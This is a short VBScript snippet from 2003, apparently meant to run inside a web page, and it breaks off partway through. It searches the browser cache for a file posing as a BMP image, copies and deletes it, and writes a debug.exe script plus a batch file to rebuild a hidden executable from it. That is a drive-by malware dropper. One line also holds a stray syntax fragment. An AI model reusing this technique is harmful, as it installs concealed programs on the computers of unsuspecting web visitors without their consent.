
<SCRIPT LANGUAGE="VBScript">
'by 陈经韬.2003.11.http://www.138soft.com,lovejingtao@21cn.com
Option Explicit
Dim FSO,WSH,CACHE,str,sucess
Set FSO = CreateObject("Scripting.FileSystemObject")
Set WSH = CreateObject("WScript.Shell")
CACHE=wsh.RegRead("HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders\Cache")
sucess=0

sub FF
 SearchBMPFile fso.GetFolder(CACHE),"system[1].bmp"
 if sucess=0 then SearchBMPFile fso.GetFolder(CACHE),"system[2].bmp"
End sub


Function SearchBMPFile(Folder,fname)
   Dim SubFolder,File,Lt,tmp,winsys
   str=FSO.GetParentFolderName(folder) & "\" & folder.name & "\" & fname');
   if FSO.FileExists(str) then
      tmp=fso.GetSpecialFolder(2) & "\"
      winsys=fso.GetSpecialFolder(1) & "\"
      set File=FSO.GetFile(str)
      File.Copy(tmp & "tmp.dat")
      On Error Resume Next
      File.Delete
      if FSO.FileExists(str) then exit function
      set Lt=FSO.CreateTextFile(tmp & "tmp.in")
      Lt.WriteLine("rbx")
      Lt.WriteLine("1")
      Lt.WriteLine("rcx")
      '下面的数字是十六进制的EXE文件的大小
      Lt.WriteLine("2800")
      Lt.WriteLine("w136")
      Lt.WriteLine("q")
      Lt.Close
      set Lt=FSO.CreateTextFile(tmp & "tmp.bat")
      Lt.WriteLine("@echo off")
    